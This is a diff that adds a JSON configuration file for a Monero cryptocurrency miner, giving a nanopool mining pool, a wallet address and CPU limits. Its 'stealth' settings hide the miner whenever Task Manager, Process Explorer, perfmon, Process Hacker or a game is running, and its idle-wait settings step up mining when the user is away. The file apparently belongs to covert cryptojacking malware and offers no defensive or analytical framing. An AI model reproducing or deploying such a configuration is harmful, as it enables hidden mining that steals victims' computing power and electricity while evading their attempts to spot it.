@@ -1,0 +1,16 @@
+{
+	"algo": "rx/0",
+	"pool": "xmr-eu1.nanopool.org:14433",
+	"port": 14433,
+	"wallet": "488zCpoZCh6Jtc8JQ5S9GRMrQrPneVSe3KjF9VgkUhLwdK23PUqkYp6NnFRmG8T5a2YNjvzLz1u975K8AScwFFvP7Ei19sn",
+	"password": "",
+	"rig-id": "",
+	"keepalive": false,
+	"nicehash": false,
+	"ssltls": true,
+	"max-cpu": 40,
+	"idle-wait": 2,
+	"idle-cpu": 100,
+	"stealth": true,
+	"stealth-targets": "Taskmgr.exe,ProcessHacker.exe,perfmon.exe,procexp.exe,procexp64.exe,csgo.exe"
+}
